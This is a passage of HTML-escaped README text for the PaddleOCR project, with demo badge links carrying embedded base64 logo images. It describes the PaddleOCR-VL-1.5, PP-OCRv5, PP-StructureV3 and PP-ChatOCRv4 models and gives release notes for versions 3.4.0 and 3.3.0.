z/Yn3kOAp2f1Kf0Weony7pn/cPydvhQYV+eFOfmOu7VB/ViPe34/EN3RFHY/yRuT8ddCtMPH/McBAT5s+vRde/gf2c/sPsjLK+m5IBQF5tO+h2tTlBGnP6693JdsvofjOPnnEHkh2TnV/X1fBl9S5zrwuwF8NFrAVJVwCAPTe8gaJlomqlp0pv4Pjn98tJ/t/fL++6unpR1YGC2n/KCoa0tTLoKiEeUPDl94nj+5/Tv3/eT5vBQ60X1S0oZr+IWRR8Ldhu7AlLjPISlJcO9vrFotky9SpzDequlwEir5beYAc0R7D9KS1DXva0jhYRDXoExPdc6yw5GShkZXe9QdO/uOvHofxjrV/TNS6iMJS+4TcSTgk9n5agJdBQbB//IfF/HpvPt3Tbi7b6I6K0R72p6ajryEJrENW2bbeVUGjfgoals4L443c7BEE4mJO2SpbRngxQrAKRudRzGQ8jVOL2qDVjjI8K1gc3TIJ5KiFZ1q+gdsARPB4NQS4AjwVSt72DSoXNyOWUrU5mQ9nRYyjp89Xo7oRI6Bga9QNT1mQ/ptaJq5T/7WcgAZywR/XlPGAUDdet3LE+qS0TI+g+aJU8MIqjo0Kx8Ly+maxLjJmjQ18rA0YCkxLQbUZP1WqdmyQGJLUm7VnQFqodmXSqmRrdVpqdzk5LvmvgtEcW8PMGdaS23EOWyDVbACZzUJPaqMbjDxpA3Qrgl0AikimGDbqmyT8P8NOYiqrldF8rX+YN7TopX4UoHuSCYY7cgX4gHwclQKl1zhx0THf+tCAUValzjI7Wg9EhptrkIcfIJjA94evOn8B2eHaVzvBrnl2ig0So6hvPaz0IGcOvTHvUIlE2+prqAxLSQxZlU2stql1NqCCLdIiIN/i1DBEHUoElM9dBravbiAnKqgpi4IBkw+utSPIoBijDXJipSVV7MpOEJUAc5Qmm3BnUN+w3hteEieYKfRZSIUcXKMVf0u5wD4EwsUNVvZOtUT7A2GkffHjByWpHqvRBYrTV72a6j8zZ6W0DTE86Hn04bmyWX3Ri9WH7ZU6Q7h+ZHo0nHUAcsQvVhXRDZHChwiyi/hnPuOsSEF6Exk3o6Y9DT1eZ+6cASXk2Y9k+6EOQMDGm6WBK10wOQJCBwren86cPPWUcRAnTVjGcU1LBgs9FURiX/e6479yZcLwCBmTxiawEwrOcleuu12t3tbLv/N4RLYIBhYexm7Fcn4OJcn0+zc+s8/VfPeddZHAGN6TT8eGczHdR/Gts1/MzDkThr23zqrVfAMFT33Nx1RJsx1k5zuWILLnG/vsH+Fv5D4NTVcp1Gzo8AAAAAElFTkSuQmCC&amp;amp;labelColor=white" alt="HuggingFace" /&gt;&lt;/a&gt; &lt;a href="https://www.modelscope.cn/studios/PaddlePaddle/PaddleOCR-VL-1.5_Online_Demo"&gt;&lt;img src="https://img.shields.io/badge/PaddleOCR--VL--1.5-_Demo_on_ModelScope-purple?logo=data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjIzIiBoZWlnaHQ9IjIwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KCiA8Zz4KICA8dGl0bGU+TGF5ZXIgMTwvdGl0bGU+CiAgPHBhdGggaWQ9InN2Z18xNCIgZmlsbD0iIzYyNGFmZiIgZD0ibTAsODkuODRsMjUuNjUsMGwwLDI1LjY0OTk5bC0yNS42NSwwbDAsLTI1LjY0OTk5eiIvPgogIDxwYXRoIGlkPSJzdmdfMTUiIGZpbGw9IiM2MjRhZmYiIGQ9Im05OS4xNCwxMTUuNDlsMjUuNjUsMGwwLDI1LjY1bC0yNS42NSwwbDAsLTI1LjY1eiIvPgogIDxwYXRoIGlkPSJzdmdfMTYiIGZpbGw9IiM2MjRhZmYiIGQ9Im0xNzYuMDksMTQxLjE0bC0yNS42NDk5OSwwbDAsMjIuMTlsNDcuODQsMGwwLC00Ny44NGwtMjIuMTksMGwwLDI1LjY1eiIvPgogIDxwYXRoIGlkPSJzdmdfMTciIGZpbGw9IiMzNmNmZDEiIGQ9Im0xMjQuNzksODkuODRsMjUuNjUsMGwwLDI1LjY0OTk5bC0yNS42NSwwbDAsLTI1LjY0OTk5eiIvPgogIDxwYXRoIGlkPSJzdmdfMTgiIGZpbGw9IiMzNmNmZDEiIGQ9Im0wLDY0LjE5bDI1LjY1LDBsMCwyNS42NWwtMjUuNjUsMGwwLC0yNS42NXoiLz4KICA8cGF0aCBpZD0ic3ZnXzE5IiBmaWxsPSIjNjI0YWZmIiBkPSJtMTk4LjI4LDg5Ljg0bDI1LjY0OTk5LDBsMCwyNS42NDk5OWwtMjUuNjQ5OTksMGwwLC0yNS42NDk5OXoiLz4KICA8cGF0aCBpZD0ic3ZnXzIwIiBmaWxsPSIjMzZjZmQxIiBkPSJtMTk4LjI4LDY0LjE5bDI1LjY0OTk5LDBsMCwyNS42NWwtMjUuNjQ5OTksMGwwLC0yNS42NXoiLz4KICA8cGF0aCBpZD0ic3ZnXzIxIiBmaWxsPSIjNjI0YWZmIiBkPSJtMTUwLjQ0LDQybDAsMjIuMTlsMjUuNjQ5OTksMGwwLDI1LjY1bDIyLjE5LDBsMCwtNDcuODRsLTQ3Ljg0LDB6Ii8+CiAgPHBhdGggaWQ9InN2Z18yMiIgZmlsbD0iIzM2Y2ZkMSIgZD0ibTczLjQ5LDg5Ljg0bDI1LjY1LDBsMCwyNS42NDk5OWwtMjUuNjUsMGwwLC0yNS42NDk5OXoiLz4KICA8cGF0aCBpZD0ic3ZnXzIzIiBmaWxsPSIjNjI0YWZmIiBkPSJtNDcuODQsNjQuMTlsMjUuNjUsMGwwLC0yMi4xOWwtNDcuODQsMGwwLDQ3Ljg0bDIyLjE5LDBsMCwtMjUuNjV6Ii8+CiAgPHBhdGggaWQ9InN2Z18yNCIgZmlsbD0iIzYyNGFmZiIgZD0ibTQ3Ljg0LDExNS40OWwtMjIuMTksMGwwLDQ3Ljg0bDQ3Ljg0LDBsMCwtMjIuMTlsLTI1LjY1LDBsMCwtMjUuNjV6Ii8+CiA8L2c+Cjwvc3ZnPg==&amp;amp;labelColor=white" alt="ModelScope" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://aistudio.baidu.com/community/app/91660/webUI"&gt;&lt;img src="https://img.shields.io/badge/PP--OCRv5-Demo_on_AI_Studio-1927BA?logo=data:image/png;base64,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&amp;amp;labelColor=white" alt="AI Studio" /&gt;&lt;/a&gt; &lt;a href="https://aistudio.baidu.com/community/app/518494/webUI"&gt;&lt;img src="https://img.shields.io/badge/PP--StructureV3-Demo_on_AI_Studio-1927BA?logo=data:image/png;base64,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&amp;amp;labelColor=white" alt="AI Studio" /&gt;&lt;/a&gt; &lt;a href="https://aistudio.baidu.com/community/app/518493/webUI"&gt;&lt;img src="https://img.shields.io/badge/PP--ChatOCRv4-Demo_on_AI_Studio-1927BA?logo=data:image/png;base64,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&amp;amp;labelColor=white" alt="AI Studio" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;PaddleOCR-VL-1.5: 0.9B VLM for Real-World Document Parsing and Text Spotting&lt;/strong&gt; A SOTA and resource-efficient model designed for real-world document parsing and text spotting tasks. It achieves comprehensive leadership across six major scenarios: normal, skew, warping, scanning, varied lighting, and screen photography in document parsing task. It introduces the leading new capabilities for text spotting and seal recognition, strengthens the parsing of complex elements (such as text, tables, formulas, and charts), and expands language support to 111 languages‚Äîall while maintaining extremely low resource consumption.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;PaddleOCR-VL - Multilingual Document Parsing via a 0.9B VLM&lt;/strong&gt;&lt;br /&gt; &lt;strong&gt;The SOTA and resource-efficient model tailored for document parsing&lt;/strong&gt;, that supports 109 languages and excels in recognizing complex elements (e.g., text, tables, formulas, and charts), while maintaining minimal resource consumption.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;PP-OCRv5 ‚Äî Universal Scene Text Recognition&lt;/strong&gt;&lt;br /&gt; &lt;strong&gt;Single model supports five text types&lt;/strong&gt; (Simplified Chinese, Traditional Chinese, English, Japanese, and Pinyin) with &lt;strong&gt;13% accuracy improvement&lt;/strong&gt;. Solves multilingual mixed document recognition challenges.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;PP-StructureV3 ‚Äî Complex Document Parsing&lt;/strong&gt;&lt;br /&gt; Intelligently converts complex PDFs and document images into &lt;strong&gt;Markdown and JSON files that preserve original structure&lt;/strong&gt;. &lt;strong&gt;Outperforms&lt;/strong&gt; numerous commercial solutions in public benchmarks. &lt;strong&gt;Perfectly maintains document layout and hierarchical structure&lt;/strong&gt;.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;PP-ChatOCRv4 ‚Äî Intelligent Information Extraction&lt;/strong&gt;&lt;br /&gt; Natively integrates ERNIE 4.5 to &lt;strong&gt;precisely extract key information&lt;/strong&gt; from massive documents, with 15% accuracy improvement over previous generation. Makes documents "&lt;strong&gt;understand&lt;/strong&gt;" your questions and provide accurate answers.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;In addition to providing an outstanding model library, PaddleOCR 3.0 also offers user-friendly tools covering model training, inference, and service deployment, so developers can rapidly bring AI applications to production.&lt;/p&gt; 
&lt;div align="center"&gt; 
 &lt;p&gt; &lt;img width="100%" src="https://raw.githubusercontent.com/cuicheng01/PaddleX_doc_images/main/images/paddleocr/README/Arch.jpg" alt="PaddleOCR Architecture" /&gt; &lt;/p&gt; 
&lt;/div&gt; 
&lt;p&gt;&lt;strong&gt;Special Note&lt;/strong&gt;: PaddleOCR 3.x introduces several significant interface changes. &lt;strong&gt;Old code written based on PaddleOCR 2.x is likely incompatible with PaddleOCR 3.x&lt;/strong&gt;. Please ensure that the documentation you are reading matches the version of PaddleOCR you are using. &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/update/upgrade_notes.html"&gt;This document&lt;/a&gt; explains the reasons for the upgrade and the major changes from PaddleOCR 2.x to 3.x.&lt;/p&gt; 
&lt;h2&gt;üì£ Recent updates&lt;/h2&gt; 
&lt;h3&gt;üî•üî• 2026.1.29: PaddleOCR 3.4.0 released, includes:&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Released PaddleOCR-VL-1.5: 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Model Introduction:&lt;/strong&gt; 
    &lt;ul&gt; 
     &lt;li&gt;PaddleOCR-VL-1.5 is a new version of PaddleOCR-VL, with a heightened focus on document parsing capabilities in real-world scenarios and the expansion of new functionalities. Powered by the innovative &lt;strong&gt;PP-DocLayoutV3&lt;/strong&gt; algorithm for irregular shape positioning, it achieves precise layout analysis across natural document scenarios involving skew, warping, scanning, varied lighting, and screen photography. The compact multi-modal model, &lt;strong&gt;PaddleOCR-VL-1.5-0.9B&lt;/strong&gt;, maintains its original parameter count while expanding its leading capabilities in text spotting, and seal recognition. Language support has been extended to &lt;strong&gt;111 languages&lt;/strong&gt;, and element recognition in complex scenarios has been significantly strengthened. The model is now available on &lt;a href="https://huggingface.co/PaddlePaddle/PaddleOCR-VL-1.5"&gt;HuggingFace&lt;/a&gt;. You can also experience it online or call the API via the &lt;a href="https://www.paddleocr.com"&gt;PaddleOCR Official Website&lt;/a&gt;.&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt;&lt;strong&gt;Core Features:&lt;/strong&gt; 
    &lt;ul&gt; 
     &lt;li&gt;&lt;strong&gt;SOTA Performance in Document Parsing:&lt;/strong&gt; PaddleOCR-VL-1.5 achieved a high precision of &lt;strong&gt;94.5%&lt;/strong&gt; on the OmniDocBench v1.5 benchmark, surpassing top-tier global general large models and specialized document parsing models.&lt;/li&gt; 
     &lt;li&gt;&lt;strong&gt;SOTA Performance Across 5 Real-World Scenarios:&lt;/strong&gt; Introducing an innovative document parsing approach, it is the first to support irregular document layout positioning. It outperforms open-source and closed-source models across all the five real-world scenarios: skew, warping, scanning, varied lighting, and screen photography.&lt;/li&gt; 
     &lt;li&gt;&lt;strong&gt;Capability Expansion Based on a 0.9B Compact Model:&lt;/strong&gt; With a parameter size of just 0.9B, PaddleOCR-VL-1.5 has expanded its scope to include text spotting, and seal recognition, setting new SOTA results across these related tasks.&lt;/li&gt; 
     &lt;li&gt;&lt;strong&gt;Enhanced Multi-Element Recognition:&lt;/strong&gt; The model features improved recognition performance for specific scenarios and multi-language content, including special symbols, ancient texts, multi-language tables, underlines, and checkboxes. Language coverage has been expanded to include &lt;strong&gt;Tibetan and Bengali&lt;/strong&gt;.&lt;/li&gt; 
     &lt;li&gt;&lt;strong&gt;Long Document Cross-Page Parsing:&lt;/strong&gt; The model supports automatic merging of cross-page tables and the identification of cross-page paragraph headings, effectively solving the issue of content fragmentation in long document parsing.&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;2025.10.16: Release of PaddleOCR 3.3.0&lt;/strong&gt;&lt;/summary&gt; 
 &lt;ul&gt; 
  &lt;li&gt; &lt;p&gt;Released PaddleOCR-VL:&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt; &lt;p&gt;&lt;strong&gt;Model Introduction&lt;/strong&gt;:&lt;/p&gt; 
     &lt;ul&gt; 
      &lt;li&gt;&lt;strong&gt;PaddleOCR-VL&lt;/strong&gt; is a SOTA and resource-efficient model tailored for document parsing. Its core component is PaddleOCR-VL-0.9B, a compact yet powerful vision-language model (VLM) that integrates a NaViT-style dynamic resolution visual encoder with the ERNIE-4.5-0.3B language model to enable accurate element recognition. &lt;strong&gt;This innovative model efficiently supports 109 languages and excels in recognizing complex elements (e.g., text, tables, formulas, and charts), while maintaining minimal resource consumption&lt;/strong&gt;. Through comprehensive evaluations on widely used public benchmarks and in-house benchmarks, PaddleOCR-VL achieves SOTA performance in both page-level document parsing and element-level recognition. It significantly outperforms existing solutions, exhibits strong competitiveness against top-tier VLMs, and delivers fast inference speeds. These strengths make it highly suitable for practical deployment in real-world scenarios. The model has been released on &lt;a href="https://huggingface.co/PaddlePaddle/PaddleOCR-VL"&gt;HuggingFace&lt;/a&gt;. Everyone is welcome to download and use it! More introduction infomation can be found in &lt;a href="https://www.paddleocr.ai/latest/version3.x/algorithm/PaddleOCR-VL/PaddleOCR-VL.html"&gt;PaddleOCR-VL&lt;/a&gt;.&lt;/li&gt; 
     &lt;/ul&gt; &lt;/li&gt; 
    &lt;li&gt; &lt;p&gt;&lt;strong&gt;Core Features&lt;/strong&gt;:&lt;/p&gt; 
     &lt;ul&gt; 
      &lt;li&gt;&lt;strong&gt;Compact yet Powerful VLM Architecture&lt;/strong&gt;: We present a novel vision-language model that is specifically designed for resource-efficient inference, achieving outstanding performance in element recognition. By integrating a NaViT-style dynamic high-resolution visual encoder with the lightweight ERNIE-4.5-0.3B language model, we significantly enhance the model‚Äôs recognition capabilities and decoding efficiency. This integration maintains high accuracy while reducing computational demands, making it well-suited for efficient and practical document processing applications.&lt;/li&gt; 
